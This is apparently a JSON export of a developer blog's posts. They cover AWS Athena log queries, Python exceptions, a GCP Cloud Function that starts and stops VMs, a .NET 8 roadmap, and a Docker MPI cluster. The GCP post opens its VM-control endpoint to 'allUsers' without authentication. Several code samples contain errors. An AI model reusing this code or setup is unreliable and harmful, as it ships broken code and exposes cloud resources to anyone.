[ { "title": "Distrubuted Log Aggregation Using SQL", "url": "/posts/Distrubuted-Log-Aggregation-Using-SQL/", "categories": "Blogs, Data Engineering", "tags": "data engineering, AWS, cloud computing", "date": "2024-11-25 02:00:00 +0500", "snippet": "I was talking to a friend recently and she happens to be a performance test engineer. It had been a stressful day for her because it took her an entire day to analyze some performance results. You ...", "content": "I was talking to a friend recently and she happens to be a performance test engineer. It had been a stressful day for her because it took her an entire day to analyze some performance results. You might be wondering: Sure, it takes time to actually run performance tests but how can it take an entire day to analyze the results?Well, I must admit that the ‚Äútaking the entire day‚Äù part is a bit of an exaggeration. But it was taking way more time than it should have. Let me explain how.The project she‚Äôs working on is a multi-tenant, multi-user setup where each tenant ‚Äúowns‚Äù multiple IoT devices. Since those tenants mostly have geographically distributed edge devices, each edge device in a particular geographical region communicates with the tenant via ‚Äúregional nodes‚Äù. In our context, that means each regional node collects logs from the edge devices in its scope, combines them, and sends them down to the tenant.Here‚Äôs how I imagined it:My friend had to target the following scenario: Edge devices poll for highly specific content, which is always 1048000 bytes in size For each polling request, an edge device logs the response size and response time These logs are being sent to the corresponding regional node Each regional node is configured to send back these logs (in CSV format) to the tenant in batchesThe real test, however, was simulating numerous edge devices from around the world simultaneously hitting this API.After much consideration, beyond the scope of this blog, her team put together a distributed test setup on AWS, to imitate this behavior.They‚Äôre now using: EC2 instances representing regional nodes Docker containers, running in each AWS EC2 instance, representing edge devices Each Docker container starts up with a script to make an n number of polling requests to the API server, record the response size and time, and provide them to their host instance Each AWS EC2 instance, in return, uploads these logs to a shared Amazon S3 bucket.After the test, our Amazon S3 bucket supposedly had hundreds of CSV files that look like this:response_size,response_time1048000,533.921048000,548.341048000,527.131048000,544.231048000,580.051048000,570.71.........If you‚Äôve made it this far, you deserve to know the real challenge. Here‚Äôs the task my friend‚Äôs boss assigned her, based on the test results: Given these several hundred files with identical schemas, calculate the average response time for a successful polling request to the API server.My approach would have been the tedious manual route: opening each file in Microsoft Excel, calculating averages, and then a cumulative average across all files. But my clever friend found a much more efficient solution. Here‚Äôs what she did: Run a script to download all objects from the S3 bucket into a folder Run another script to combine all CSV files into one giant CSV file Run an Excel formula to calculate the average response time ONLY for the records that have a response size of exactly 1048000 bytes.With my brand-new AWS knowledge and eagerness to put some of my data engineering skills to the test, I decided to make this even simpler for her.By the way, did you know you can query data from within ‚Äúobjects‚Äù using SQL? Well, I didn‚Äôt but I guess you learn something new everyday.Before we jump into the AWS solution, let me introduce you to a service that I just discovered while developing my solution, and that is‚Ä¶ Apache Hive (Hive). Apache Hive is a data warehouse software project. It is built on top of Apache Hadoop for providing data queries and analysis. Hive gives an SQL-like interface to query data stored in various databases and file systems that integrate with Hadoop. Apache Hive supports the analysis of large datasets stored in Hadoop‚Äôs HDFS and compatible file systems such as Amazon S3 filesystem and Alluxio. It provides a SQL-like query language called HiveQL with schema on read and transparently converts queries to MapReduce, Apache Tez, and Spark jobs.Wow! Just wow! Honestly, those guys on LinkedIn who go around saying ‚ÄúSQL is used everywhere‚Äù are not wrong. Apache Hive is open-source software that is literally made to provide a central querying interface for transactional databases as well as traditional file stores. So, wherever there‚Äôs a schema, Hive can let you query data using SQL, or as I should say ‚Äî HiveQL.Although Hive is pretty awesome, it is important to note that deploying Hive isn‚Äôt an easy task and requires strong operational overhead. It‚Äôs wouldn‚Äôt be cost-effective for a scenario like ours. So, what would be cost-effective? Is it something named after a Greek goddess with infinite wisdom?Yes! It‚Äôs Amazon Athena! It‚Äôs crazy to think that just a month ago, I didn‚Äôt even know this service existed and now I advocate it to everyone, from colleagues at work to my 60-year-old grandfather who just learned how to SUM a column in Excel. It‚Äôs for good reason though. Amazon Athena is a serverless, fully managed service from AWS, that allows you to query your Amazon S3 buckets and AWS Glue catalog databases, using SQL. And no, we‚Äôre not talking about some modified version of SQL called HiveQL or Amazon AthenaQL. Amazon Athena allows you to use traditional SQL ‚Äî the one we all know and love!So how did Amazon Athena save the day? We already have an Amazon S3 bucket with countless files containing possibly millions of records right? Well, we can use another AWS service called AWS Glue, to create a ‚Äúcrawler‚Äù, that will go through the entire Amazon S3 bucket, infer each file‚Äôs schema and create tables for all schemas. Let‚Äôs do it!Alright, now let‚Äôs dive into the AWS Console and search for AWS Glue.Now, let‚Äôs click on Crawlers under the Data Catalog section of the AWS Glue console.Click on Create Crawler in the top right.Let‚Äôs go through the process of creating our crawler:Step 1 - Crawler PropertiesConfigure the name, description, and tags for your crawlerStep 2 ‚Äî Data SourceConfigure the data source for the crawler i.e. our Amazon S3 bucket. As for the configuration, since we know that all our data follows a fixed schema, we can manually create a AWS Glue catalog table to map our crawler to. However, to fully demonstrate the capabilities of our crawler (which is inferring schemas from the files themselves), we‚Äôll go with Not yet and we‚Äôll add our Amazon S3 bucket (or folder) as a data source.Step 3 - Configuring Crawler SecurityFirst off, we need to create a AWS Glue service role and assign it to the crawler for it to work. On this page, we can also configure encryption at rest for the AWS Cloudwatch logs pushed by our crawler but there‚Äôs no need for that in our use case.Step 4 ‚Äî Crawler Output ConfigurationThis part is important so let me break it down for you: First, we need to tell the crawler which AWS Glue catalog database to add new tables to/update tables in. I already have one but in case you don‚Äôt, you can click on the Add Database option and move forward with these steps once your database is ready. Then, we need to tell the crawler to group together all files that follow a similar schema into a single table. This is probably the most IMPORTANT configuration for our use case since we want to aggregate the results from multiple files. Finally, we set the schedule frequency to On Demand. Since these crawlers mostly work together with ETL pipelines, AWS Glue gives you the option to run crawlers as cron jobs. However, since we just want our table to be updated when we run a test, we set it to On Demand.Once we‚Äôre done reviewing our details, we can proceed with the creation of the crawler, where we‚Äôre taken to that crawler. To run the crawler, we can click on Run Crawler on the top right.Once our crawler has successfully crawled the Amazon S3 bucket, you will be able to see the status Completed for the latest run in the Crawler Runs section.Now, we should be good to go and query our logs using Amazon Athena! However, before moving, we need to confirm if our crawler was successful. To do this, we can click on Tables under the Data Catalog section of the AWS Glue console.One last thing we can do before moving on is to check if our crawler inferred the schema correctly. To do this, we can click on the table and check the Schema section. And voila! The deed is done. We have response_size and response_time as query-able attributes.Well, that took quite a few clicks didnt it? I would say it took about as much effort as my friend puts into combining files and then querying them in Microsoft Excel, every time she runs a test. However, the good thing about this setup is that it only has to be done once. Now that we‚Äôve created our crawler, my friend only needs to run it everytime she runs her tests and she‚Äôs good to go.Oops. I almost forgot the querying part. Off to Amazon Athena!And‚Ä¶ Here it is! Our query editor.We make sure that AWSDataCatalog is selected as the Data source and our AWS Glue catalog database is selected as the Database. Now, my friend can run a query as simple asSELECT AVG(response_time) AS average_response_timeFROM \"blog-catalog\".\"responses\"WHERE response_size = 1048000;to analyze her test results!Or maybe, she could run the following to also get a count for the number of records that account for the average value:SELECT COUNT(*) as successful_responses, AVG(response_time) AS average_response_timeFROM \"blog-catalog\".\"responses\"WHERE response_size = 1048000;ConclusionNow that you‚Äôve seen how powerful AWS Glue and Amazon Athena are when paired up together, I‚Äôm sure you‚Äôll also utilize them for basic log aggregation.Honestly, the use cases of these services are endless and go far beyond going over logs that have 2 attributes and calculating the average. Both AWS Glue and Amazon Athena are probably the most-used cloud services by data engineers for big data processing.AWS Glue allows you to create, schedule and run ETL jobs on the go, without having to manage the overhead of Apache Spark clusters. Amazon Athena, while maybe not as powerful as Apache Hive, gives you a major chunk of Apache Hive‚Äôs functionality while allowing you to focus more on data engineering than managing the infrastructure. Also, did I mention that Amazon Athena integrates with existing Apache Hive clusters like jam and bread?I just started my journey as a data engineer a few months ago and honestly, there‚Äôs so much to learn. AWS has made it easier for me to focus more on learning data engineering concepts than to worry about setups and troubleshooting installation failures. So, if you‚Äôre also someone like me looking to get into the fascinating world of big data, I‚Äôd definitely recommend having AWS-managed services as your go-to!" }, { "title": "Polymorphism Hidden in Plain Sight?", "url": "/posts/Polymorphism-Hidden-in-Plain-Sight/", "categories": "Blogs, Software Engineering", "tags": "softwareengineering, objectorientedprogramming, systemdesign, scalability, maintainability, polymorphism, abstraction", "date": "2024-09-17 11:48:00 +0500", "snippet": "Yes. Today, rather than revisiting the traditional Animal-&gt;Cat and Animal-&gt;Dog example, we‚Äôre going to look at a real-life example of polymorphism that all Python developers probably interact...", "content": "Yes. Today, rather than revisiting the traditional Animal-&gt;Cat and Animal-&gt;Dog example, we‚Äôre going to look at a real-life example of polymorphism that all Python developers probably interact with on a daily basis. But first, let‚Äôs clarify what polymorphism actually is.According to ChatGPT, Polymorphism is a fundamental concept in object-oriented programming that allows objects of different types to be treated as if they are of the same type. It enables a single interface to be used for different underlying forms (data types).In simple terms, polymorphism allows for loosely coupled code by enabling the use of a base class (or interface) throughout the codebase while extending its functionality.I wouldn‚Äôt say the traditional Cat/Dog example is bad, but if you‚Äôre like me, you probably need something that resonates with your daily coding experience to truly grasp the concept. So, here goes‚Ä¶We‚Äôve all encountered Exceptions in Python, right? Even the most experienced Python developer is bound to make a mistake and face an Exception. However, different errors trigger different types of exceptions, like the FileNotFoundError or OSError. Now if we just want these exceptions to terminate the execution of our code and tell us what‚Äôs wrong, raising a specific kind of exception is fine. But what if we want to catch those exceptions and handle errors gracefully? Do we keep adding except blocks for each type of error? That would probably cost you development years. This is where polymorphism comes in!All exceptions are built upon a base class called Exception, in Python. A custom definition of an exception in Python would look something like this:class JustARandomException(Exception): \"\"\"\tJust a random exception to show what custom exceptions look like\t\"\"\"Essentially, our exception is derived from the built-in Exception class in Python. Now you might be wondering how this helps decouple our code. Don‚Äôt worry, we‚Äôre here to solve that mystery. Imagine a function XYZ performing a series of operations. In that series of operations, there‚Äôs a possibility of encountering countless types of exceptions. However, since it‚Äôs production code, you don‚Äôt want the application to crash. You just want to show the end-user a graceful error and allow the main thread to keep running. Here‚Äôs what Python allows you to do:def func():\ttry:\t\tdo_something()\t\tdo_something_else()\texcept Exception as e:\t\tprint(f\"An unexpected error occurred: {e}\")Now, you don‚Äôt have to add multiple except blocks to handle the infinite possibilities for the types of errors, but you‚Äôll get to know the type of error in the variable ‚Äúe‚Äù. What this means is all exceptions are essentially of type Exception. Because of polymorphism, all you need to do is add a generic Exception handler while throwing countless types of custom exceptions throughout your code.Just to be clear, use cases vary, and this type of exception handling might not be suitable for every situation. The point of this post was just to explain polymorphism with a concept you‚Äôre already familiar with. Here‚Äôs a few ways you might want to handle exceptions:try:\tdo_something()except Exception as e:\tif isinstance(e, ValueError):\t\tprint(\"Some line that tells the user how they could avoid this error\")\telse:\t\tprint(f\"An unexpected error occurred: {e}\")ortry:\tdo_something()except ValueError:\tprint(\"Some line that tells the user how they could avoid this error\")except Exception as e:\tprint(f\"An unexpected error occurred: {e}\")Note that in a production environment, showing the exact error message thrown by an exception is considered a bad security practice, so something like this might be more suited:try:\tdo_something()except Exception as e:\tprint(f\"An unexpected error occurred. Please contact our support team for further assistance\")Anyway, this discussion might be a slight deviation from our main topic. In simple words, the except block only accepts the Exception type as an argument, which allows the developer to add exception handling throughout the code, or even across multiple services, in a more flexible manner." }, { "title": "Instant Cloud VMs With a cURL Command", "url": "/posts/Instant-Cloud-VMs-With-a-cURL-Command/", "categories": "Blogs, Cloud Computing", "tags": "cloud computing, cloud, public cloud, IaaS, google cloud, cloud functions, lambda functions", "date": "2024-02-06 12:29:00 +0500", "snippet": "Cloud computing has been around for a while, and we all know its basics. Some things are easy to navigate around, and some aren‚Äôt, but I think we should all agree upon the fact that the consoles pr...", "content": "Cloud computing has been around for a while, and we all know its basics. Some things are easy to navigate around, and some aren‚Äôt, but I think we should all agree upon the fact that the consoles provided by Google, Azure and AWS are a bit disappointing when it comes to UX. Google is a king when it comes to the tech-verse but somehow, they managed to mess up web socket integration in their cloud portal.Let me give an example. Go to console.cloud.google.com and try to create a new Compute Engine instance. If you don‚Äôt keep reloading the page, the console won‚Äôt tell you that your instance is running. This is probably because the state isn‚Äôt being reflected in real-time. Even though this is the most nitpicky example to ever exist, there are multiple other areas where the console disappoints but let‚Äôs not get into those.Being a perfectionist, I Googled up a solution for this (ironic, isn‚Äôt it?) and came to know about Cloud Functions! Yes, serverless compute might just be able to help you with your problem but let‚Äôs first see what these functions really are: Run your code in the cloud with no servers or containers to manage with our scalable, pay-as-you-go functions as a service (FaaS) product.This is how Google defines cloud functions but here is what they actually are: Google Cloud Functions are mini-programs that run in the cloud. They respond to events triggered by other Google Cloud services or HTTP requests. You write code to define what happens when these events occur. They scale automatically, meaning they can handle varying workloads without you needing to manage resources.Yeah‚Ä¶ you still don‚Äôt get it do you? No judgement, I wouldn‚Äôt have either if someone pasted a ChatGPT answer in 4 bullet points. Google Cloud Functions, in the simplest terms possible, allow us to write and run code, in the cloud, without the need to manage or run a server, while heavily integrating with other Google Cloud services.AdvantagesWith Cloud Functions, you get: Scalability: Scale you function endlessly without the need for manual intervention or even a load-balancing setup. Cost Effectiveness: Pay per request i.e. you only pay a small amount per hit/call on your function.DisadvantagesIf you are like me, this must‚Äôve got you thinking that you can host your entire business using Cloud Functions and hey, maybe you can. But first, there are a few things that you cannot do with Cloud Functions: 10 MB limit on both HTTP request and response sizes. Maximum 32 GB memory available to a single cloud function 500 MB source size, including modules.Now that we‚Äôve covered the basics, how exactly can cloud functions help us get rid of our UX complaints? You might have guessed by now, but if you haven‚Äôt, here‚Äôs how- by creating your own REST API that helps you start and stop Compute Engine instances! Build your dream UI and integrate Google Cloud into it. Manage your instances without the need to reload the console page!I don‚Äôt know if this classifies as click-bait or not but if you‚Äôre here for a tutorial on creating an entire custom web console for Google Cloud, you might be in for a disappointment. I‚Äôm just here to give you the Cloud Functions part; the rest is on you. Now, without further ado, let‚Äôs dive into how you can create/start/stop VMs, in the cloud, through a cURL command!How do we create a Cloud Function? Navigate to console.cloud.google.com/functions/list. Click on the Create Function button on the top left. Give your function a name, choose your region and choose the computational limits you want to apply. Click next!What now?Google Cloud Functions allow us to use various programming languages but I, for the purpose of this tutorial, will be using Python 3.10.First of all, we need go ahead and edit the requirements.txt file:functions-framework==3.* google-api-python-client==1.10.0We need to add the second line to make sure we have the required pip module to interact with Google Cloud. Once we‚Äôre done with the pre-requisites, we can move on to writing our code in the main.py file.Here‚Äôs what we need to start with:@functions_framework.http def hello_http(request): \"\"\" Driver for cloud function \"\"\" if request.method == 'OPTIONS': # letting CORS know that it's okay to hit GET/POST on this endpoint headers = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'POST', 'Access-Control-Allow-Headers': 'Content-Type', 'Access-Control-Max-Age': '3600' } return ('', 204, headers) headers = { # headers to attach to each response we send 'Access-Control-Allow-Methods': 'POST', 'Access-Control-Allow-Origin': '*' } if request.json['operation']=='START': response = start_vm(request.json['id'], headers) elif request.json['operation']=='STOP': response = stop_vm(request.json['id'], headers) else response = ('Invalid Operation', 400, headers) return responseAn apology in advance for the lack of error handling or any bad practices. You can modify the code according to your requirements as this blog is just to provide you with a basic idea of how everything works. In the driver function, we basically added a few formalities to cater to the ‚ÄúSame origin policy‚Äù that our browsers are so fond of (kidding, they‚Äôre there for our security).For interacting with our compute instances, we can use the Google Cloud Compute SDK Reference. However, here‚Äôs the code for starting and stopping a particular instance.def start_vm(id, headers): project_id = '&lt;YOUR PROJECT ID HERE&gt;' zone_name = '&lt;THE ZONE OF YOUR CHOICE HERE&gt;' compute = googleapiclient.discovery.build('compute', 'v1') _ = compute.instances().start(project=project_id, zone=zone_name, instance=vm_name).execute() instance_details = compute.instances().get(project=project_id, zone=zone_name, instance=id).execute() return (instance details, 200, headers) def stop_vm(id, headers): project_id = '&lt;YOUR PROJECT ID HERE&gt;' zone_name = '&lt;THE ZONE OF YOUR CHOICE HERE&gt;' compute = googleapiclient.discovery.build('compute', 'v1') _ = compute.instances().stop(project=project_id, zone=zone_name, instance=vm_name).execute() return ('', 204, headers)For the above code to work, you need to add your own project id and zone in which your instances are. Given that, if you hit test function and hit the function with the following request, you should see your instance started in the GCP Console.{ \"operation\": \"START\", \"id\": &lt;NAME OF YOUR INSTANCE HERE&gt; }Now, if you click on DEPLOY and try to run the same request with a cURL command, it won‚Äôt work; that‚Äôs because we haven‚Äôt allowed our function to be accessed publicly. To do that, we need to do the following: Go to https://console.cloud.google.com/run Select the newly created function Click on Permissions Click on Add Principal and select the ‚ÄúallUsers‚Äù principal Assign it the following role: Cloud Run InvokerNow you‚Äôre good to go! Use the following cURL command to start your cloud instances:curl -X POST \\ -H \"Content-Type: application/json\" \\ -d '{ \"operation\": \"START\", \"id\": \"&lt;NAME OF YOUR INSTANCE HERE&gt;\" }' \\ https://&lt;URL OF YOUR CLOUD FUNCTION&gt;GoodbyeThat‚Äôs it for this blog. I hope it helps everyone who is new to Google Cloud and wants to play around with the Compute SDK!" }, { "title": "Getting Started with .NET 8 Core as a Complete Noob", "url": "/posts/Getting-Started-with-.NET-8-Core-as-a-Complete-Noob/", "categories": "Blogs, Software Engineering", "tags": "software engineering, dotnet, aspdotnet, csharp", "date": "2024-01-10 16:44:00 +0500", "snippet": "Why Choose .NET Core in 2024?Why would you choose .NET Core when you have a billion other frameworks to choose from? You have Django for the Python magic, you have NestJS for it‚Äôs native support fo...", "content": "Why Choose .NET Core in 2024?Why would you choose .NET Core when you have a billion other frameworks to choose from? You have Django for the Python magic, you have NestJS for it‚Äôs native support for Javascript. Why do you go out of your way to work on an overly complicated framework based on C#? Well, here‚Äôs a few reasons why you might have to without wanting to: Client Needs: .NET framework was widely adopted in legacy systems due to its streamlined coupling with Microsoft Windows while being open-source and cross platform. Thousands of companies have huge code-bases using older versions of .NET which might take years to migrate to frameworks using another language. Clients want to keep their software up-to-date, easy to maintain and powerful but maybe they can‚Äôt afford to spend years on migration. That‚Äôs where ASP.NET Core comes in as a modern framework which is easy to migrate to. Strong Community: ASP.NET Core, without a doubt, probably has one of the largest and unstoppable communities in the world. From Stack Overflow to LinkedIn articles, everyone talks about it and loves it. Any question asked will probably be responded to within a matter of minutes or at max, hours! Who doesn‚Äôt want this kind of efficiency during intense coding sessions and large-scale projects? I know I do! Power: Being a an open-source framework with 1200+ active contributors, everything is at your disposal. Want third-party integration with OpenAI? It‚Äôs there. Want to develop a cloud-first application on Microsoft Azure? You‚Äôre already there if your‚Äôe using .NET Core. With Minimal APIs, you have the power to create a quick, lightweight REST API just like you would on Flask or FastAPI, but all Object-Oriented Programming principles are also there. With 300,000+ Nuget Packages, you can do anything from background jobs to full-blown scalable web applications. Now that we‚Äôve got that sorted out, let‚Äôs dive into my roadmap for .NET 8 Core.Why Do We Need a Roadmap?You might not need it ü§∑‚Äç‚ôÇÔ∏è. I for one, struggled a lot when I was requested to start my training with .NET. Even though the community is huge, there is immense confusion between the ‚ÄúPre .NET 6‚Äù way of doing things and how they are done in .NET 8. Not to mention that 90% of community support is for MVC and not Web APIs. With a week behind schedule and having nothing to show to my supervisor, I was not only panicking but also feeling like a failure. That‚Äôs where my inner voice knocked some sense into me, saying: Come on! You‚Äôve never worked with C# in your entire life! This was bound to happen. You just need some time and you‚Äôll do good.With requirements like ‚ÄúFollow SOLID principles‚Äù, ‚ÄúIdentity Framework‚Äù and ‚ÄúUse Clean Architecture‚Äù, I wasn‚Äôt convinced at all but I had no option but to pull myself together and produce some actual results.With no single tutorial to follow and experience with Google Dorking, I set off on a journey to learn the .NET Core framework as a total noob.Roadmap Dependency Injection Clean Architecture Repository Pattern Entity Framework Core Creating a ControllerDependency Injection ‚ÄúIn software engineering, dependency injection is a programming technique in which an object or function receives other objects or functions that it requires, as opposed to creating them internally. Dependency injection aims to separate the concerns of constructing objects and using them, leading to loosely coupled programs.‚ÄùThis is the Wikipedia definition for Dependency Injection. But what is it really? Basically, a particular service is initialized globally and ‚Äúinjected‚Äù into any service dependant on it. This pattern leads to looser coupling between the two services which, in turn, improves readability and maintainability. Dependency injection will be more clear in the Respository Pattern section of our roadmap.Clean ArchitectureIf you‚Äôre new to .NET development, you might have seen this diagram somewhere. Don‚Äôt worry if it gets confusing because it‚Äôs really not. The .NET way of following the ‚ÄúSeparation of Concerns‚Äù principle is not to create separate folders but to create separate projects entirely. I know, it‚Äôs confusing and you might be thinking ‚ÄúWhat??? ü§¨‚Äù. But hey, it‚Äôs really not as complicated as it sounds. At the end of your initial project setup, you‚Äôll be able to navigate through those projects as though they are folders. For that, however, I‚Äôll need your attention for a few basic principles: Inner layers MAY NOT access outer layers directlyWait? Is that it? Well, yes for the most part. But let‚Äôs dive into how Clean Architecture actually separates concerns. Domain Layer: This layer contains your entities and your common objects such as enumerators, global constants and global helpers. Application: This layer contains 99% of your application‚Äôs business logic. What‚Äôs the basic flow of your application? What Data-transfer Objects (DTO) should be used? How should the application behave in a certain function? Infrastructure: This layer contains third-party integration, database integration and related logic. Framework: Finally, the outermost layer is the layer closest to your client. In short, this layer will contain your controllers, web APIs, etc. As for the initial project setup, each of these layers will be a separate ‚Äúproject‚Äù within a single ‚Äúsolution‚Äù. How do we bind these layers together? Let‚Äôs get to that now.Repository PatternAny large-scale web application will follow the repository pattern and .NET Core applications are no exception. Each module in your application should have the following separate objects: Entity: Defines what that particular module will store. This object becomes a necessity for modules that store data to a database and allows us to define rules, and validation logic for each storable object. Repository: Defines low-level functions to interact directly with a database/storage mechanism. These functions act as wrappers to be used in services. Service: Defines high-level functions to take care of the business logic of your application. Services mostly use repositories and don‚Äôt interact directly with databases. Controller: Defines API endpoints for our web application. Controllers use services to initiate or direct a certain portion of our business logic. If you couldn‚Äôt guess, Entities belong in ‚ÄúDomain‚Äù, Repositories belong in ‚ÄúInfrastructure‚Äù, Services belong in ‚ÄúApplication‚Äù and Controllers belong in ‚ÄúFramework‚ÄùI used the word ‚Äúuse‚Äù in the above definitions. How does each object use another? This is where Dependency Injection comes into play. First, you have to provide add inner-layer projects to each outer-layer project‚Äôs references. To do that, we can do the following: Right click on your project in the ‚ÄúSolution Explorer‚Äù Navigate to Add &gt; Project Reference Tick all inner-layer projects Finally, repeat this process for each outer-layer project.Once this is done, you will be able to access all classes, functions, constants etc. of inner projects from an outer project. However, we still need to inject instances of each object that we want to use. To inject dependencies, we need an interface and an implementation. Think of an interface as a definition and the implementation as the actual logic.I‚Äôll give you a basic project structure to get you started with a basic ‚ÄúCompany Controller‚Äù:|_ Project.Domain| |_Entities| |_Company.cs||_ Project.Infrastructure| |_Repositories| | |_CompanyRepository.cs| |_DependencyInjection.cs||_ Project.Application| |_Repositories| | |_ICompanyRepository.cs| |_Contracts| | |_ICompanyService.cs| | |_CompanyService.cs| |_DependencyInjection.cs||_ Project.Framework |_Controllers | |_CompanyController.cs |_Program.cs In short, you need to define function prototypes in each interface (Files starting with ‚ÄòI‚Äô) and you can implement them in each class. You might be wondering why the Repository Interface is in ‚ÄúApplication‚Äù and the actual implementation is in ‚ÄúInfrastructure‚Äù. This is because repositories are used on the application layer but since the application layer can not directly access the database, the ‚Äúwrappers‚Äù need to be implemented in the infrastructure layer. Now that we have our project set up, we can start injecting services.There are 3 Service Lifetimes in .NET Core. Here is how we can use AddTransient to inject our repository and service in our DI container:// Project.Application/DependencyInjection.cs...public static IServiceCollection InjectServices(this IServiceCollection services){ services.AddTransient&lt;ICompanyRepository, CompanyRepository&gt;(); services.AddTransient&lt;ICompanyService, CompanyService&gt;();}...// Project.Framework/Program.cs...builder.Services.InjectServices();...// Project.Application/Repositories/ICompanyRepository.cspublic interface ICompanyRepository { void AddCompany(string name);}That‚Äôs it! Now you can use your repository in your service through constructor dependency injection. All you have to do in your service is:// Project.Application/Contracts/CompanyService.cspublic class CompanyService: ICompanyService { private readonly ICompanyRepository _companyRepository; //declaring a pointer to the repository public CompanyService(ICompanyRepository companyRepository) { _companyRepository = companyRepository; } public void SampleUse(string name) { _companyRepository.AddCompany(name); }}Entity Framework CoreOf course, as good modern-day developers, we don‚Äôt want to spend time on manually creating and updating tables so we follow a code-first approach. For this we use frameworks called Object-Relational Mappings (ORM). ORMs are frameworks which take care of everything from database design implementation to querying the database. No more SQLi because you‚Äôll never be writing a raw SQL query ever again! Although other ORMs exist or .NET Core, the most popular and trusted ORM is Entity Framework Core. Let me give you an example:Instead of writing db.ExecuteNonQuery(\"SELECT * FROM companies;\"), you can just write db.Companies. This is because EFCore gives you all the low-level querying functions pre-built. Not only that, but you can combine LINQ with EFCore to get the SQL feel without actually writing any SQL. eg.from company in companiesselect company;I will not be getting into the entire API reference provided by EFCore but I will tell you how to get started with it.SetupTo set up EF Core, we need an entity, a ‚ÄúDatabase Context‚Äù and dependency injection.// Project.Domain/Entities/Company.cspublic class Company { [Unique] public string Id {get;set;} [Required] public required string Name {get;set;}}// Project.Infrastructure/ApplicationDbContext.cspublic class ApplicationDbContext: DbContext { public DbSet&lt;Company&gt; Companies {get; set;}}// Project.Framework/appsettings.json\"ConnectionStrings\":{ \"DefaultConnection\": \"&lt;YOUR DATABASE CONNECTION STRING HERE&gt;\"}// Project.Infrastructure/DependencyInjection.cs...public static IServiceCollection InjectDatabase(this IServiceCollection services, IConfiguration configuration) { services.AddDbContext&lt;ApplicationDbContext&gt;(options =&gt; options.UseSqlServer (configuration.GetConnectionString(\"DefaultConnection\"), b =&gt; b.MigrationsAssembly (typeof(ApplicationDbContext).Assembly.FullName)), ServiceLifetime.Transient );}...// Project.Framework/Program.cs...builder.Services.InjectDatabase(builder.Configuration);...Database SetupNow that we have set up our codebase, it‚Äôs time to set up the database. Don‚Äôt worry, you won‚Äôt have to do that manually. Just open up your ‚ÄúPackage Manager Console‚Äù in Visual Studio and run the following commands:Add-Migration IntialMigrationUpdate-DatabaseCongratulations! Your database will now have a ‚ÄúCompany‚Äù table with attributes matching the ones you have set up in your entity.Implementing a RepositoryWe have everything setup and now it‚Äôs time to implement our Company Repository.// Program.Infrastructure/Repositories/CompanyRepository.cspublic class CompanyRepository: ICompanyRepository { private readonly ApplicationDbContext _db; public CompanyRepository(ApplicationDbContext db){ _db = db; } public async void AddCompany(string name) { var company = new Company { Name = name }; await _db.Companies.AddAsync(company); await _db.SaveChangesAsync(); }}Creating a ControllerYou might be wondering where our REST API is. Don‚Äôt worry, I will show you how to do that as well. Let‚Äôs create a CompanyController now!// Project.Framework/Controllers/CompanyController.cs[Route(\"api/[controller]\")][ApiController]public class CompanyController: ControllerBase { private readonly ICompanyService _companyService; public CompanyController(ICompanyService companyService) { _companyService = companyService; } [HttpGet] public async IActionResult GetCompanies(){ throw new NotImplementedException(); } [HttpGet(\"{id}\")] public async IActionResult GetCompany([FromRoute] string id) { throw new NotImplementedException(); } [HttpPost] public async IActionResult CreateCompany([FromBody] string name) { return Created(await _companyService.SampleUse(name)); } [HttpPut] public async IActionResult UpdateCompany( [FromRoute] string id [FromBody] string name ) { throw new NotImplementedException(); } [HttpDelete] public async IActionResult DeleteCompany([FromRoute] string id) { throw new NotImplementedException(); }}.NET Core provides annotations for all HTTP verbs and also provides an IActionResult datatype to return HTTP status codes along with corresponding data. You can follow this tutorial to learn more about the functionality provided in ASP.NET Core controllers.Next StepsWhile the above is enough to get you a basic understanding of API development with .NET 8, following the good practices, it is definitely not a complete course on backend development. The learning for backend development never stops with its ever-growing nature. However, here are the next steps I took to get through my training: Introduction to Identity Framework Authentication and Authorization Global Exception Handling and Logging Unit and Integration Testing Background Jobs with HangfireConclusionWhile I may not have become a pro at .NET Core, I hope my blog helps all my fellow newcomers to have an easier transition to .NET Core development!" }, { "title": "Setting up your own Beowulf Cluster on Docker as a PoC", "url": "/posts/Setting-up-your-own-Beowulf-Cluster-on-Docker-as-a-PoC/", "categories": "Blogs, Distributed Computing", "tags": "distributed computing, parallel computing, cluster, docker, docker cluster, docker compose, docker swarm", "date": "2023-09-08 11:44:00 +0500", "snippet": "Why?Due to the ever-evolving world of information technology, computational needs are increasing day by day while the ability to miniaturize processors is about to reach its cap. That is where para...", "content": "Why?Due to the ever-evolving world of information technology, computational needs are increasing day by day while the ability to miniaturize processors is about to reach its cap. That is where parallel and distributed computing comes in! With the concept of parallel computing, you can train a single AI model on multiple machines simultaneously.How?Just buy a few machines and setup mpicc. But seriously, what if you‚Äôre broke (like me) and lazy (also like me) but still want to get done with that one assignment that requires you to work on a cluster. You‚Äôre in luck because I have the perfect tutorial for you.Pre-requisites Set up a Linux virtual machine Set up Docker and Docker ComposeSteps Clone the repository git clone https://github.com/NLKNguyen/alpine-mpich Navigate the the cluster directory cd alpine-mpich/cluster/ (The next two steps can be skipped for just poof of concept) Place your MPI-ready source code(s) in the project directory Modify the Dockerfile and replace mpi_hello_world.c with the entry point for your source code Build an n-machine cluster using docker-compose with the cluster.sh startup script sudo ./cluster.sh up size=&lt;n&gt; Login to the master container sudo ./cluster.sh login Run your program on multiple machines! mpirun ./mpi_hello_world Sample output: /project $ mpirun ./mpi_hello_world Warning: Permanently added 'cluster_worker_1.cluster_net,172.21.0.3' (ECDSA) to the list of known hosts. Warning: Permanently added 'cluster_worker_2.cluster_net,172.21.0.4' (ECDSA) to the list of known hosts. Hello world from processor 8fdb4a274e55, rank 0 out of 3 processors Hello world from processor 7d192a900f77, rank 1 out of 3 processors Hello world from processor b8d5d4ffae67, rank 2 out of 3 processors Reference taken from the official Github repository for alpine-mpichWhat is happening?docker-composeThe following is the docker-compose file for this projectversion: \"2\"services: registry: image: registry ports: - \"${REGISTRY_PORT}:5000\" master: image: $REGISTRY_ADDR:$REGISTRY_PORT/$IMAGE_NAME user: root entrypoint: [\"mpi_bootstrap\", \"role=master\", \"mpi_master_service_name=master\", \"mpi_worker_service_name=worker\"] ports: - \"${SSH_PORT}:22\" networks: - net worker: image: $REGISTRY_ADDR:$REGISTRY_PORT/$IMAGE_NAME user: root entrypoint: [\"mpi_bootstrap\", \"role=worker\", \"mpi_master_service_name=master\", \"mpi_worker_service_name=worker\"] networks: - netnetworks: net:Docker compose is basically a tool to orchestrate containers locally without having to set up each one individually at run time. With the help of docker-compose, we are doing the following: Defining a master container with SSH open Defining a worker container Defining a virtual 